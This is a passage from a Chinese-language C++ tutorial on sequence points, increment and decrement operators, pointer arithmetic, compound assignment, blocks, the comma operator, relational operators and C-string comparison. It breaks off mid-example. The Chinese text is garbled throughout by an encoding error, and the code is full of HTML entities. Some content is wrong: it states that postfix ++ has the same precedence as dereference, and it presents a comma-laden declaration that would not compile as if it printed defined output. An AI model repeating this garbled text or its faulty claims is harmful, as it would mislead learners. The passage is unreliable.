åœ¨ä¸¤ä¸ªé¡ºåºç‚¹ä¹‹é—´ï¼Œä¸è¦å¯¹åŒä¸€ä¸ªå˜é‡è¿›è¡Œå¤šæ¬¡ä¿®æ”¹ï¼Œæˆ–è€…æ—¢ä¿®æ”¹å®ƒåˆè¯»å–å®ƒï¼ˆé™¤äº†è¯»å–å®ƒçš„å€¼ä»¥è®¡ç®—è¦å†™å…¥çš„å€¼ä¹‹å¤–ï¼‰ã€‚å¦åˆ™ï¼Œè¡Œä¸ºæ˜¯**æœªå®šä¹‰çš„ (Undefined Behavior)**ï¼Œç¼–è¯‘å™¨å¯èƒ½äº§ç”Ÿä»»ä½•ç»“æœã€‚ ç¤ºä¾‹ (æœªå®šä¹‰è¡Œä¸º): 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int x = 5; int y; // æœªå®šä¹‰è¡Œä¸º: åœ¨åŒä¸€è¡¨è¾¾å¼ä¸­å¤šæ¬¡ä¿®æ”¹ xï¼Œä¸”æ²¡æœ‰é¡ºåºç‚¹åˆ†éš” // y = (x++) * (x++); // ä¸è¦è¿™æ ·å†™! ç»“æœä¸å¯é¢„æµ‹ // y = x + (++x); // ä¸è¦è¿™æ ·å†™! ç»“æœä¸å¯é¢„æµ‹ // std::cout &lt;&lt; x &lt;&lt; (++x); // ä¸è¦è¿™æ ·å†™! è¾“å‡ºé¡ºåºå’Œ x çš„æœ€ç»ˆå€¼ä¸å¯é¢„æµ‹ // å®‰å…¨çš„å†™æ³•: ä½¿ç”¨é¡ºåºç‚¹åˆ†éš”å‰¯ä½œç”¨ y = x++; // y è·å– x çš„åŸå§‹å€¼ 5, ç„¶å x å˜ä¸º 6 (å‰¯ä½œç”¨åœ¨åˆ†å·å¤„å®Œæˆ) std::cout &lt;&lt; &quot;y = &quot; &lt;&lt; y &lt;&lt; &quot;, x = &quot; &lt;&lt; x &lt;&lt; std::endl; // è¾“å‡º y = 5, x = 6 y = ++x; // x å…ˆå˜ä¸º 7, ç„¶å y è·å–æ–°å€¼ 7 (å‰¯ä½œç”¨åœ¨åˆ†å·å¤„å®Œæˆ) std::cout &lt;&lt; &quot;y = &quot; &lt;&lt; y &lt;&lt; &quot;, x = &quot; &lt;&lt; x &lt;&lt; std::endl; // è¾“å‡º y = 7, x = 7 return 0;&#125; ç»“è®º: é¿å…åœ¨å•ä¸ªè¡¨è¾¾å¼ä¸­å¯¹åŒä¸€å˜é‡äº§ç”Ÿå¤æ‚çš„ã€ä¾èµ–äºå‰¯ä½œç”¨é¡ºåºçš„æ“ä½œã€‚å°†å®ƒä»¬åˆ†è§£æˆå¤šä¸ªè¯­å¥é€šå¸¸æ›´å®‰å…¨ã€æ›´æ¸…æ™°ã€‚ 5.1.7 å‰ç¼€æ ¼å¼å’Œåç¼€æ ¼å¼é€’å¢ (++) å’Œé€’å‡ (--) è¿ç®—ç¬¦éƒ½æœ‰ä¸¤ç§ä½¿ç”¨å½¢å¼ï¼š å‰ç¼€ (Prefix): è¿ç®—ç¬¦æ”¾åœ¨æ“ä½œæ•°ä¹‹å‰ (++x, --x)ã€‚ è¡Œä¸º: å…ˆä¿®æ”¹æ“ä½œæ•°çš„å€¼ï¼ˆåŠ  1 æˆ–å‡ 1ï¼‰ï¼Œç„¶åä½¿ç”¨ä¿®æ”¹åçš„å€¼ä½œä¸ºæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœã€‚ åç¼€ (Postfix): è¿ç®—ç¬¦æ”¾åœ¨æ“ä½œæ•°ä¹‹å (x++, x--)ã€‚ è¡Œä¸º: å…ˆä½¿ç”¨æ“ä½œæ•°çš„åŸå§‹å€¼ä½œä¸ºæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœï¼Œç„¶åå†ä¿®æ”¹æ“ä½œæ•°çš„å€¼ï¼ˆåŠ  1 æˆ–å‡ 1ï¼‰ã€‚ åŒºåˆ«åœ¨äºè¡¨è¾¾å¼çš„å€¼: è¡¨è¾¾å¼ è¡Œä¸ºæè¿° è¡¨è¾¾å¼çš„å€¼ æ“ä½œæ•°æœ€ç»ˆå€¼ ++x å…ˆå°† x åŠ  1 x çš„æ–°å€¼ æ–°å€¼ x++ å…ˆä½¿ç”¨ x çš„åŸå§‹å€¼ x çš„åŸå§‹å€¼ æ–°å€¼ --x å…ˆå°† x å‡ 1 x çš„æ–°å€¼ æ–°å€¼ x-- å…ˆä½¿ç”¨ x çš„åŸå§‹å€¼ x çš„åŸå§‹å€¼ æ–°å€¼ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;int main() &#123; int a = 5, b = 5; int result_a, result_b; // å‰ç¼€é€’å¢ result_a = ++a; // a å…ˆå˜æˆ 6, ç„¶å result_a è¢«èµ‹å€¼ä¸º 6 std::cout &lt;&lt; &quot;Prefix: result_a = &quot; &lt;&lt; result_a &lt;&lt; &quot;, a = &quot; &lt;&lt; a &lt;&lt; std::endl; // è¾“å‡º 6, 6 // åç¼€é€’å¢ result_b = b++; // result_b å…ˆè¢«èµ‹å€¼ä¸º b çš„åŸå§‹å€¼ 5, ç„¶å b å˜æˆ 6 std::cout &lt;&lt; &quot;Postfix: result_b = &quot; &lt;&lt; result_b &lt;&lt; &quot;, b = &quot; &lt;&lt; b &lt;&lt; std::endl; // è¾“å‡º 5, 6 // åœ¨ for å¾ªç¯æ›´æ–°éƒ¨åˆ†ï¼Œé€šå¸¸å‰ç¼€å’Œåç¼€æ•ˆæœç›¸åŒ // ä½†åœ¨å¤æ‚è¡¨è¾¾å¼ä¸­ï¼Œå®ƒä»¬çš„åŒºåˆ«å¾ˆé‡è¦ int arr[] = &#123;10, 20, 30&#125;; int index = 0; // ä½¿ç”¨åç¼€è·å–å€¼å¹¶ç§»åŠ¨ç´¢å¼• int val1 = arr[index++]; // val1 = arr[0] (10), index å˜ä¸º 1 std::cout &lt;&lt; &quot;val1 = &quot; &lt;&lt; val1 &lt;&lt; &quot;, index = &quot; &lt;&lt; index &lt;&lt; std::endl; // ä½¿ç”¨å‰ç¼€ç§»åŠ¨ç´¢å¼•å¹¶è·å–å€¼ index = 0; // é‡ç½® index int val2 = arr[++index]; // index å…ˆå˜ä¸º 1, val2 = arr[1] (20) std::cout &lt;&lt; &quot;val2 = &quot; &lt;&lt; val2 &lt;&lt; &quot;, index = &quot; &lt;&lt; index &lt;&lt; std::endl; return 0;&#125; æ€§èƒ½å»ºè®®: å¯¹äºå†…ç½®ç±»å‹ï¼ˆå¦‚ int, double, æŒ‡é’ˆï¼‰ï¼Œå‰ç¼€å’Œåç¼€çš„æ€§èƒ½å·®å¼‚é€šå¸¸å¯ä»¥å¿½ç•¥ã€‚ä½†å¯¹äºç”¨æˆ·å®šä¹‰çš„ç±»ç±»å‹ï¼ˆè¿­ä»£å™¨ç­‰ï¼‰ï¼Œå‰ç¼€å½¢å¼ (++it) é€šå¸¸æ¯”åç¼€å½¢å¼ (it++) æ•ˆç‡æ›´é«˜ï¼Œå› ä¸ºåç¼€å½¢å¼éœ€è¦åˆ›å»ºä¸€ä¸ªä¸´æ—¶å¯¹è±¡æ¥ä¿å­˜åŸå§‹å€¼ã€‚å› æ­¤ï¼Œåœ¨ä¸éœ€è¦ä½¿ç”¨åŸå§‹å€¼çš„æƒ…å†µä¸‹ï¼Œå…»æˆä¼˜å…ˆä½¿ç”¨å‰ç¼€é€’å¢/é€’å‡çš„ä¹ æƒ¯æ˜¯å¥½çš„ã€‚ 5.1.8 é€’å¢/é€’å‡è¿ç®—ç¬¦å’ŒæŒ‡é’ˆ++ å’Œ -- è¿ç®—ç¬¦å¯ä»¥åº”ç”¨äºæŒ‡é’ˆï¼Œå…¶æ•ˆæœæ˜¯ä½¿æŒ‡é’ˆæŒ‡å‘å†…å­˜ä¸­çš„ä¸‹ä¸€ä¸ªæˆ–ä¸Šä¸€ä¸ªå…ƒç´ ã€‚ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ ¹æ®æŒ‡é’ˆæŒ‡å‘çš„æ•°æ®ç±»å‹çš„å¤§å°æ¥è°ƒæ•´åœ°å€ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;int main() &#123; double arr[3] = &#123;1.1, 2.2, 3.3&#125;; double *ptr = arr; // ptr æŒ‡å‘ arr[0] std::cout &lt;&lt; &quot;Initial pointer: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // æŒ‡å‘ 1.1 // å‰ç¼€é€’å¢æŒ‡é’ˆ ++ptr; std::cout &lt;&lt; &quot;After ++ptr: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // æŒ‡å‘ 2.2 // åç¼€é€’å¢æŒ‡é’ˆ ptr++; std::cout &lt;&lt; &quot;After ptr++: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // æŒ‡å‘ 3.3 // å‰ç¼€é€’å‡æŒ‡é’ˆ --ptr; std::cout &lt;&lt; &quot;After --ptr: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // æŒ‡å‘ 2.2 // åç¼€é€’å‡æŒ‡é’ˆ ptr--; std::cout &lt;&lt; &quot;After ptr--: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // æŒ‡å‘ 1.1 // ç»“åˆè§£å¼•ç”¨ (æ³¨æ„ä¼˜å…ˆçº§) ptr = arr; // é‡ç½® double val; // *ptr++ : è·å– ptr å½“å‰æŒ‡å‘çš„å€¼ï¼Œç„¶å ptr æŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´  (åç¼€ ++ ä¼˜å…ˆçº§é«˜äº *) val = *ptr++; std::cout &lt;&lt; &quot;val = *ptr++ : val = &quot; &lt;&lt; val &lt;&lt; &quot;, ptr now points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // val=1.1, ptr æŒ‡å‘ 2.2 // *++ptr : ptr å…ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œç„¶åè·å–æ–°æŒ‡å‘çš„å€¼ (å‰ç¼€ ++ ä¼˜å…ˆçº§é«˜äº *) ptr = arr; // é‡ç½® val = *++ptr; std::cout &lt;&lt; &quot;val = *++ptr : val = &quot; &lt;&lt; val &lt;&lt; &quot;, ptr now points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // val=2.2, ptr æŒ‡å‘ 2.2 // ++*ptr : è·å– ptr æŒ‡å‘çš„å€¼ï¼Œç„¶åå°†è¯¥å€¼åŠ  1 (è§£å¼•ç”¨ * ä¼˜å…ˆçº§é«˜äºå‰ç¼€ ++) ptr = arr; // é‡ç½® ++*ptr; // å°† arr[0] çš„å€¼ä» 1.1 å¢åŠ åˆ° 2.1 std::cout &lt;&lt; &quot;After ++*ptr : arr[0] = &quot; &lt;&lt; arr[0] &lt;&lt; &quot;, ptr points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // arr[0]=2.1, ptr æŒ‡å‘ 2.1 // (*ptr)++ : è·å– ptr æŒ‡å‘çš„å€¼ï¼Œç„¶åå°†è¯¥å€¼åŠ  1 (æ‹¬å·å¼ºåˆ¶å…ˆè§£å¼•ç”¨) ptr = arr; // é‡ç½® arr[0] = 1.1; // æ¢å¤ arr[0] (*ptr)++; // å°† arr[0] çš„å€¼ä» 1.1 å¢åŠ åˆ° 2.1 std::cout &lt;&lt; &quot;After (*ptr)++: arr[0] = &quot; &lt;&lt; arr[0] &lt;&lt; &quot;, ptr points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // arr[0]=2.1, ptr æŒ‡å‘ 2.1 return 0;&#125; ä¼˜å…ˆçº§: è§£å¼•ç”¨ * å’Œå‰/åç¼€ ++/-- çš„ä¼˜å…ˆçº§ç›¸åŒï¼Œç»“åˆæ€§æ˜¯ä»å³åˆ°å·¦ã€‚ä¸ºäº†æ¸…æ™°èµ·è§ï¼Œå½“ç»“åˆä½¿ç”¨æ—¶ï¼Œä½¿ç”¨æ‹¬å· () æ˜¯ä¸ªå¥½ä¸»æ„ï¼Œä¾‹å¦‚ (*ptr)++ã€‚ 5.1.9 ç»„åˆèµ‹å€¼è¿ç®—ç¬¦C++ æä¾›äº†ä¸€ç»„ç»„åˆèµ‹å€¼è¿ç®—ç¬¦ï¼Œå°†ç®—æœ¯è¿ç®—å’Œèµ‹å€¼è¿ç®—åˆå¹¶ä¸ºä¸€ä¸ªè¿ç®—ç¬¦ï¼Œä½¿ä»£ç æ›´ç®€æ´ã€‚ è¿ç®—ç¬¦ ç¤ºä¾‹ ç­‰ä»·äº += x += y x = x + y -= x -= y x = x - y *= x *= y x = x * y /= x /= y x = x / y %= x %= y x = x % y &amp;= x &amp;= y x = x &amp; y ` =` `x ^= x ^= y x = x ^ y &lt;&lt;= x &lt;&lt;= y x = x &lt;&lt; y &gt;&gt;= x &gt;&gt;= y x = x &gt;&gt; y ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; int score = 100; int bonus = 10; int penalty = 5; int factor = 2; score += bonus; // score = score + bonus; score å˜ä¸º 110 std::cout &lt;&lt; &quot;Score after bonus: &quot; &lt;&lt; score &lt;&lt; std::endl; score -= penalty; // score = score - penalty; score å˜ä¸º 105 std::cout &lt;&lt; &quot;Score after penalty: &quot; &lt;&lt; score &lt;&lt; std::endl; score *= factor; // score = score * factor; score å˜ä¸º 210 std::cout &lt;&lt; &quot;Score after factor: &quot; &lt;&lt; score &lt;&lt; std::endl; score /= 3; // score = score / 3; score å˜ä¸º 70 (æ•´æ•°é™¤æ³•) std::cout &lt;&lt; &quot;Score after division: &quot; &lt;&lt; score &lt;&lt; std::endl; score %= 8; // score = score % 8; score å˜ä¸º 6 (70 é™¤ä»¥ 8 ä½™ 6) std::cout &lt;&lt; &quot;Score after modulo: &quot; &lt;&lt; score &lt;&lt; std::endl; // åœ¨ for å¾ªç¯æ›´æ–°ä¸­ä½¿ç”¨ int total = 0; for (int i = 1; i &lt;= 5; ++i) &#123; total += i; // ç´¯åŠ  &#125; std::cout &lt;&lt; &quot;Total (1-5): &quot; &lt;&lt; total &lt;&lt; std::endl; // è¾“å‡º 15 return 0;&#125; ç»„åˆèµ‹å€¼è¿ç®—ç¬¦é€šå¸¸æ›´æ˜“è¯»ï¼Œå¹¶ä¸”å¯èƒ½æ¯”åˆ†å¼€å†™ç¨å¾®é«˜æ•ˆä¸€äº›ã€‚ 5.1.10 å¤åˆè¯­å¥ï¼ˆè¯­å¥å—ï¼‰å¤åˆè¯­å¥ (Compound Statement) æˆ– è¯­å¥å— (Block) æ˜¯ç”±ä¸€å¯¹èŠ±æ‹¬å· &#123;&#125; æ‹¬èµ·æ¥çš„é›¶æ¡æˆ–å¤šæ¡è¯­å¥ã€‚ ä½œç”¨: è¯­æ³•éœ€è¦: åœ¨ C++ è¯­æ³•è¦æ±‚åªèƒ½å‡ºç°ä¸€æ¡è¯­å¥çš„åœ°æ–¹ï¼ˆä¾‹å¦‚ if, else, for, while çš„å¾ªç¯ä½“ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨è¯­å¥å—æ¥åŒ…å«å¤šæ¡è¯­å¥ã€‚ åˆ›å»ºä½œç”¨åŸŸ: è¯­å¥å—ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„**å±€éƒ¨ä½œç”¨åŸŸ (Local Scope)**ã€‚åœ¨å—å†…å£°æ˜çš„å˜é‡ï¼ˆè‡ªåŠ¨å­˜å‚¨å˜é‡ï¼‰åªåœ¨è¯¥å—å†…éƒ¨å¯è§ï¼Œå¹¶åœ¨å—ç»“æŸæ—¶é”€æ¯ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122#include &lt;iostream&gt;int main() &#123; int x = 10; if (x &gt; 5) &#123; // if åé¢éœ€è¦ä¸€æ¡è¯­å¥ï¼Œè¿™é‡Œä½¿ç”¨è¯­å¥å— std::cout &lt;&lt; &quot;x is greater than 5.&quot; &lt;&lt; std::endl; int y = x * 2; // y åªåœ¨ if å—å†…éƒ¨å¯è§ std::cout &lt;&lt; &quot;Double x is: &quot; &lt;&lt; y &lt;&lt; std::endl; &#125; // y åœ¨è¿™é‡Œé”€æ¯ // std::cout &lt;&lt; y; // é”™è¯¯! y åœ¨æ­¤ä½œç”¨åŸŸä¸å¯è§ std::cout &lt;&lt; &quot;Loop with block:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 2; ++i) &#123; // for å¾ªç¯ä½“ä½¿ç”¨è¯­å¥å— std::cout &lt;&lt; &quot; Outer loop i = &quot; &lt;&lt; i &lt;&lt; std::endl; int j = i + 10; // j åªåœ¨ for å¾ªç¯çš„å½“å‰è¿­ä»£å—å†…å¯è§ std::cout &lt;&lt; &quot; Inner variable j = &quot; &lt;&lt; j &lt;&lt; std::endl; &#125; // æ¯æ¬¡è¿­ä»£ç»“æŸæ—¶ j é”€æ¯ return 0;&#125; 5.1.11 å…¶ä»–è¯­æ³•æŠ€å·§â€”â€”é€—å·è¿ç®—ç¬¦é€—å·è¿ç®—ç¬¦ (,) æ˜¯ C++ ä¸­ä¼˜å…ˆçº§æœ€ä½çš„è¿ç®—ç¬¦ã€‚å®ƒå…è®¸å°†ä¸¤ä¸ªè¡¨è¾¾å¼è¿æ¥æˆä¸€ä¸ªè¡¨è¾¾å¼ã€‚ è¡Œä¸º: å…ˆè®¡ç®—é€—å·å·¦ä¾§çš„è¡¨è¾¾å¼ã€‚ ä¸¢å¼ƒå·¦ä¾§è¡¨è¾¾å¼çš„è®¡ç®—ç»“æœã€‚ ç„¶åè®¡ç®—é€—å·å³ä¾§çš„è¡¨è¾¾å¼ã€‚ æ•´ä¸ªé€—å·è¡¨è¾¾å¼çš„ç»“æœæ˜¯å³ä¾§è¡¨è¾¾å¼çš„å€¼å’Œç±»å‹ã€‚ ä¸»è¦ç”¨é€”: for å¾ªç¯çš„åˆå§‹åŒ–å’Œæ›´æ–°éƒ¨åˆ†: å…è®¸åœ¨è¿™äº›éƒ¨åˆ†æ‰§è¡Œå¤šä¸ªæ“ä½œï¼Œè€Œä¸éœ€è¦è¯­å¥å—ã€‚ (è¾ƒå°‘è§) åœ¨éœ€è¦å•ä¸ªè¡¨è¾¾å¼çš„åœ°æ–¹æ‰§è¡Œå¤šä¸ªæœ‰å‰¯ä½œç”¨çš„æ“ä½œã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; // åœ¨ for å¾ªç¯ä¸­ä½¿ç”¨é€—å·è¿ç®—ç¬¦ int i, j; std::cout &lt;&lt; &quot;Using comma in for loop:&quot; &lt;&lt; std::endl; for (i = 0, j = 10; // åˆå§‹åŒ–: åˆå§‹åŒ– i å’Œ j i &lt; j; // æ¡ä»¶ ++i, --j) // æ›´æ–°: é€’å¢ i, é€’å‡ j &#123; std::cout &lt;&lt; &quot;i = &quot; &lt;&lt; i &lt;&lt; &quot;, j = &quot; &lt;&lt; j &lt;&lt; std::endl; &#125; // é€—å·è¡¨è¾¾å¼çš„å€¼ int x; int result = (x = 5, x + 10); // x å…ˆè¢«èµ‹å€¼ä¸º 5, ç„¶åè®¡ç®— x+10 (15) // æ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœæ˜¯ 15 std::cout &lt;&lt; &quot;Result of comma expression: &quot; &lt;&lt; result &lt;&lt; std::endl; // è¾“å‡º 15 std::cout &lt;&lt; &quot;x after comma expression: &quot; &lt;&lt; x &lt;&lt; std::endl; // è¾“å‡º 5 // ä¼˜å…ˆçº§æœ€ä½ int a = 1, b = 2, c = 3; int value = a++, b += a, c += b; // é€—å·ä¼˜å…ˆçº§ä½äºèµ‹å€¼ // è¿™å®é™…ä¸Šç­‰ä»·äº: value = a++; (value=1, a=2) ç„¶åè®¡ç®— b+=a (b=2+2=4), ç„¶åè®¡ç®— c+=b (c=3+4=7) std::cout &lt;&lt; &quot;value=&quot; &lt;&lt; value &lt;&lt; &quot;, a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl; // è¾“å‡º value=1, a=2, b=4, c=7 // å¦‚æœæƒ³æŒ‰é¡ºåºæ‰§è¡Œå¹¶å–æœ€åç»“æœï¼Œéœ€è¦æ‹¬å· value = (++a, b += a, c += b); // a=3, b=4+3=7, c=7+7=14. value=14 std::cout &lt;&lt; &quot;value=&quot; &lt;&lt; value &lt;&lt; &quot;, a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl; // è¾“å‡º value=14, a=3, b=7, c=14 return 0;&#125; è™½ç„¶é€—å·è¿ç®—ç¬¦æä¾›äº†è¿™ç§èƒ½åŠ›ï¼Œä½†è¿‡åº¦ä½¿ç”¨å¯èƒ½é™ä½ä»£ç çš„å¯è¯»æ€§ã€‚åœ¨ for å¾ªç¯çš„åˆå§‹åŒ–å’Œæ›´æ–°éƒ¨åˆ†æ˜¯å…¶æœ€å¸¸è§ä¸”åˆç†çš„ç”¨é€”ã€‚ 5.1.12 å…³ç³»è¡¨è¾¾å¼å…³ç³»è¡¨è¾¾å¼ (Relational Expression) ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦æ¥æ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°çš„å€¼ï¼Œå…¶ç»“æœæ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ (true æˆ– false)ã€‚ å…³ç³»è¿ç®—ç¬¦: &lt; : å°äº (Less than) &gt; : å¤§äº (Greater than) &lt;=: å°äºæˆ–ç­‰äº (Less than or equal to) &gt;=: å¤§äºæˆ–ç­‰äº (Greater than or equal to) ==: ç­‰äº (Equal to) !=: ä¸ç­‰äº (Not equal to) è¿™äº›è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ä½äºç®—æœ¯è¿ç®—ç¬¦ï¼Œä½†é«˜äºèµ‹å€¼è¿ç®—ç¬¦ã€‚== å’Œ != çš„ä¼˜å…ˆçº§ä½äºå…¶ä»–å››ä¸ªå…³ç³»è¿ç®—ç¬¦ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int score = 85; int passing_score = 60; double temp1 = 36.5, temp2 = 37.0; bool isPassing = (score &gt;= passing_score); // æ¯”è¾ƒ score æ˜¯å¦å¤§äºç­‰äº passing_score bool isFever = (temp1 &gt; temp2); // æ¯”è¾ƒ temp1 æ˜¯å¦å¤§äº temp2 bool isEqual = (score == 85); // æ¯”è¾ƒ score æ˜¯å¦ç­‰äº 85 bool isNotEqual = (temp1 != temp2); // æ¯”è¾ƒ temp1 æ˜¯å¦ä¸ç­‰äº temp2 std::cout &lt;&lt; std::boolalpha; // ä½¿ bool è¾“å‡ºä¸º true/false std::cout &lt;&lt; &quot;Score: &quot; &lt;&lt; score &lt;&lt; &quot;, Passing Score: &quot; &lt;&lt; passing_score &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Is passing? &quot; &lt;&lt; isPassing &lt;&lt; std::endl; // è¾“å‡º true std::cout &lt;&lt; &quot;Is fever? &quot; &lt;&lt; isFever &lt;&lt; std::endl; // è¾“å‡º false std::cout &lt;&lt; &quot;Is score 85? &quot; &lt;&lt; isEqual &lt;&lt; std::endl; // è¾“å‡º true std::cout &lt;&lt; &quot;Temps not equal? &quot; &lt;&lt; isNotEqual &lt;&lt; std::endl; // è¾“å‡º true // åœ¨å¾ªç¯æ¡ä»¶ä¸­ä½¿ç”¨ int count = 0; while (count &lt; 3) &#123; // å½“ count å°äº 3 æ—¶å¾ªç¯ std::cout &lt;&lt; &quot;Count is &quot; &lt;&lt; count &lt;&lt; std::endl; count++; &#125; return 0;&#125; 5.1.13 èµ‹å€¼ã€æ¯”è¾ƒå’Œå¯èƒ½çŠ¯çš„é”™è¯¯ä¸€ä¸ªéå¸¸å¸¸è§çš„ C++ ç¼–ç¨‹é”™è¯¯æ˜¯å°†èµ‹å€¼è¿ç®—ç¬¦ (=) è¯¯ç”¨åœ¨éœ€è¦æ¯”è¾ƒè¿ç®—ç¬¦ (==) çš„åœ°æ–¹ï¼Œå°¤å…¶æ˜¯åœ¨ if æˆ– while çš„æ¡ä»¶è¯­å¥ä¸­ã€‚ if (x = 5): è¿™ä¸æ˜¯æ¯”è¾ƒ x æ˜¯å¦ç­‰äº 5ã€‚å®ƒçš„ä½œç”¨æ˜¯ï¼š å°† 5 èµ‹ç»™å˜é‡ xã€‚ æ•´ä¸ªèµ‹å€¼è¡¨è¾¾å¼ (x = 5) çš„ç»“æœæ˜¯èµ‹ç»™ x çš„å€¼ï¼Œå³ 5ã€‚ åœ¨ if æ¡ä»¶ä¸­ï¼Œéé›¶å€¼è¢«è§†ä¸º trueã€‚å› æ­¤ï¼Œè¿™ä¸ª if è¯­å¥æ€»æ˜¯ä¼šæ‰§è¡Œå…¶ä»£ç å—ï¼ˆé™¤é 5 è¢«è§†ä¸º falseï¼Œè¿™åœ¨ C++ ä¸­ä¸ä¼šå‘ç”Ÿï¼‰ï¼Œå¹¶ä¸”è¿˜ä¼šæ„å¤–åœ°å°† x çš„å€¼ä¿®æ”¹ä¸º 5ã€‚ if (x == 5): è¿™æ‰æ˜¯æ­£ç¡®çš„æ¯”è¾ƒï¼Œæ£€æŸ¥ x çš„å½“å‰å€¼æ˜¯å¦ç­‰äº 5ï¼Œç»“æœä¸º true æˆ– falseï¼Œå¹¶ä¸”ä¸ä¼šä¿®æ”¹ x çš„å€¼ã€‚ ç¤ºä¾‹: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int score = 0; std::cout &lt;&lt; &quot;Enter your score: &quot;; std::cin &gt;&gt; score; // é”™è¯¯: ä½¿ç”¨äº†èµ‹å€¼ = if (score = 100) &#123; // æ€»æ˜¯ trueï¼Œå¹¶ä¸” score è¢«æ”¹ä¸º 100 std::cout &lt;&lt; &quot;Mistake: You entered 100 (or maybe not, score is now 100).&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Mistake: This part will likely never execute.&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Score after mistaken if: &quot; &lt;&lt; score &lt;&lt; std::endl; // score æ€»æ˜¯ 100 // æ­£ç¡®: ä½¿ç”¨äº†æ¯”è¾ƒ == std::cout &lt;&lt; &quot;\\nEnter your score again: &quot;; std::cin &gt;&gt; score; if (score == 100) &#123; // æ­£ç¡®æ¯”è¾ƒ std::cout &lt;&lt; &quot;Correct: Perfect score!&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Correct: Score is not 100.&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Score after correct if: &quot; &lt;&lt; score &lt;&lt; std::endl; // score ä¿æŒç”¨æˆ·è¾“å…¥çš„å€¼ return 0;&#125; å¦‚ä½•é¿å…: ä»”ç»†æ£€æŸ¥æ¡ä»¶è¯­å¥ä¸­çš„ = å’Œ ==ã€‚ ä¸€äº›ç¼–ç é£æ ¼å»ºè®®å°†å¸¸é‡æ”¾åœ¨æ¯”è¾ƒè¿ç®—ç¬¦çš„å·¦è¾¹ï¼ˆâ€Yoda conditionsâ€ï¼‰ï¼Œä¾‹å¦‚ if (100 == score)ã€‚è¿™æ ·å¦‚æœæ„å¤–å†™æˆ if (100 = score)ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼Œå› ä¸ºä¸èƒ½ç»™å¸¸é‡èµ‹å€¼ã€‚ 5.1.14 Cé£æ ¼å­—ç¬¦ä¸²çš„æ¯”è¾ƒå¯¹äº C é£æ ¼å­—ç¬¦ä¸²ï¼ˆchar æ•°ç»„æˆ– char* æŒ‡é’ˆï¼‰ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦ï¼ˆ==, !=, &lt;, &gt; ç­‰ï¼‰æ¥æ¯”è¾ƒå­—ç¬¦ä¸²çš„å†…å®¹ã€‚ å½“å¯¹ä¸¤ä¸ª char* æŒ‡é’ˆä½¿ç”¨ == æˆ– != æ—¶ï¼Œæ¯”è¾ƒçš„æ˜¯æŒ‡é’ˆå­˜å‚¨çš„å†…å­˜åœ°å€ï¼Œè€Œä¸æ˜¯å®ƒä»¬æŒ‡å‘çš„å­—ç¬¦ä¸²å†…å®¹ã€‚ è¦æ¯”è¾ƒ C é£æ ¼å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œéœ€è¦ä½¿ç”¨ C å­—ç¬¦ä¸²åº“ &lt;cstring&gt; (æˆ– C çš„ &lt;string.h&gt;) ä¸­æä¾›çš„å‡½æ•°ï¼Œä¸»è¦æ˜¯ strcmp()ã€‚ strcmp(str1, str2): å¦‚æœ str1 æŒ‰å­—å…¸åºç­‰äº str2ï¼Œè¿”å› 0ã€‚ å¦‚æœ str1 å°äº str2ï¼Œè¿”å›è´Ÿå€¼ã€‚ å¦‚æœ str1 å¤§äº str2ï¼Œè¿”å›æ­£å€¼ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;cstring&gt; // ä¸ºäº† strcmp()int main() &#123; char word1[] = 